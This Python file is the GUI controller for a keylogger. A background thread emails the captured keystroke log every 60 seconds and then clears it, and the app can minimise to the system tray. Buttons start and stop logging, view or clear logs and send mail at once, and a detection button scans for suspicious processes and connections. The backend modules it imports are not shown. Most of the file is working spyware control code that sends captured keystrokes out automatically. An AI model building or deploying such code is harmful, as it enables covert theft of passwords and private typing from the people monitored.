import tkinter as tk
from tkinter import scrolledtext, messagebox
from keylogger_backend import KeyLogger
from log_mailer import send_email
from detector_main import list_suspicious_processes, list_open_ports
import threading
import time
import pystray
from PIL import Image, ImageDraw
import os

# --- Config ---
EMAIL_INTERVAL = 60  # seconds
LOG_PATH = os.path.join(os.path.dirname(__file__), "log.txt")
tray_icon = None

# --- Setup ---
keylogger = KeyLogger(log_file=LOG_PATH)

# --- Email Auto-send ---
def auto_send_email():
    while True:
        try:
            with open(LOG_PATH, "r") as f:
                log_data = f.read()

            if log_data.strip():
                send_email(log_data)
                with open(LOG_PATH, "w") as f:
                    f.truncate(0)

        except Exception as e:
            print("Email sending failed:", e)

        time.sleep(EMAIL_INTERVAL)

threading.Thread(target=auto_send_email, daemon=True).start()

# --- GUI Setup ---
window = tk.Tk()
window.title("Keylogger")
window.geometry("550x550")
window.configure(bg="#1e1e1e")

# --- Minimize to tray ---
def create_tray_icon():
    image = Image.new('RGB', (64, 64), color=(30, 30, 30))
    draw = ImageDraw.Draw(image)
    draw.rectangle((16, 16, 48, 48), fill=(100, 100, 255))
    icon = pystray.Icon("Keylogger", image, "Keylogger is running")

    def on_restore(icon, item):
        window.deiconify()
        icon.stop()

    icon.menu = pystray.Menu(pystray.MenuItem("Restore", on_restore))
    return icon

def minimize_to_tray():
    global tray_icon
    window.withdraw()
    tray_icon = create_tray_icon()
    threading.Thread(target=tray_icon.run, daemon=True).start()

# --- Functions ---
def start_logging():
    try:
        keylogger.start()
        status_label.config(text="Status: Running", fg="lightgreen")
        start_btn.config(state="disabled")
        stop_btn.config(state="normal")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start keylogger: {e}")

def stop_logging():
    try:
        keylogger.stop()
        status_label.config(text="Status: Stopped", fg="red")
        start_btn.config(state="normal")
        stop_btn.config(state="disabled")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to stop keylogger: {e}")

def show_logs():
    try:
        with open(LOG_PATH, "r") as f:
            logs = f.read()
        log_text.delete(1.0, tk.END)
        log_text.insert(tk.END, logs)
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found.")

def clear_logs():
    open(LOG_PATH, "w").close()
    log_text.delete(1.0, tk.END)
    messagebox.showinfo("Logs", "Logs cleared!")

def send_now():
    try:
        with open(LOG_PATH, "r") as f:
            data = f.read()
        if data.strip():
            send_email(data)
            with open(LOG_PATH, "w") as f:
                f.truncate(0)
            messagebox.showinfo("Mail", "Email sent successfully!")
        else:
            messagebox.showinfo("Mail", "No data to send.")
    except Exception as e:
        messagebox.showerror("Mail Error", str(e))

def run_detection():
    log_text.delete(1.0, tk.END)  # Clear previous output

    try:
        log_text.insert(tk.END, "🔍 Scanning for suspicious keylogger-like processes...\n\n")
        suspicious = list_suspicious_processes()
        if not suspicious:
            log_text.insert(tk.END, "✅ No suspicious keylogger-like processes found.\n\n")
        else:
            for proc in suspicious:
                log_text.insert(tk.END, f"⚠️  Suspicious Process: {proc['name']} (PID: {proc['pid']})\n")
            log_text.insert(tk.END, f"\n🚨 Total Suspicious Processes Found: {len(suspicious)}\n\n")

        log_text.insert(tk.END, "🌐 Scanning open network connections...\n\n")
        connections = list_open_ports()
        if not connections:
            log_text.insert(tk.END, "✅ No established suspicious connections found.\n")
        else:
            for conn in connections:
                log_text.insert(tk.END, f"📡 Port {conn['port']} → PID: {conn['pid']} ({conn['name']}) → Remote: {conn['remote']}\n")
            log_text.insert(tk.END, f"\n🔐 Total Active Connections: {len(connections)}\n")

    except Exception as e:
        log_text.insert(tk.END, f"[!] Detection failed: {e}")

def on_closing():
    keylogger.stop()
    print("[*] Exiting cleanly...")
    window.destroy()

window.protocol("WM_DELETE_WINDOW", on_closing)
window.bind("<Escape>", lambda event: on_closing())

# --- Widgets ---
status_label = tk.Label(window, text="Status: Stopped", fg="red", bg="#1e1e1e", font=("Segoe UI", 12))
status_label.pack(pady=5)

btn_frame = tk.Frame(window, bg="#1e1e1e")
btn_frame.pack(pady=10)

start_btn = tk.Button(btn_frame, text="Start Logging", command=start_logging, bg="#333", fg="white")
stop_btn = tk.Button(btn_frame, text="Stop Logging", command=stop_logging, bg="#333", fg="white")

start_btn.grid(row=0, column=0, padx=10)
stop_btn.grid(row=0, column=1, padx=10)
stop_btn.config(state="disabled")

tk.Button(btn_frame, text="View Logs", command=show_logs, bg="#333", fg="white").grid(row=1, column=0, pady=10)
tk.Button(btn_frame, text="Clear Logs", command=clear_logs, bg="#333", fg="white").grid(row=1, column=1, pady=10)

tk.Button(window, text="Send Mail Now", command=send_now, bg="#222", fg="white").pack(pady=5)
tk.Button(window, text="🔍 Run Detection", command=run_detection, bg="#555", fg="white").pack(pady=5)

log_text = scrolledtext.ScrolledText(window, width=60, height=10, bg="#2d2d2d", fg="white", insertbackground="white")
log_text.pack(pady=10)

minimize_btn = tk.Button(window, text="🧊 Minimize to Tray", command=minimize_to_tray, bg="#444", fg="white")
minimize_btn.pack(pady=10)

# --- Main loop ---
try:
    window.mainloop()
except KeyboardInterrupt:
    print("[!] Program manually stopped with Ctrl+C.")
    on_closing()
